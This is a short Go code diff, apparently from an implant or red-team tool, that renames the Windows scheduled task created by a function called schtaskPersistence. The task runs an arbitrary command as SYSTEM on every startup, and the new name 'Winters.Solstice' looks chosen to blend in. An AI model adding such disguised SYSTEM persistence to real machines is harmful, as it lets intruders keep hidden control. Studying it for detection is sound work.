@@ -104,7 +104,7 @@ func schtaskPersistence() error {
 	if er != nil {
 		log.Println(er)
 	}
-	_, err := cmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
+	_, err := cmdOut(fmt.Sprintf(`schtasks /create /tn "Winters.Solstice" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
 	return err
 }
 
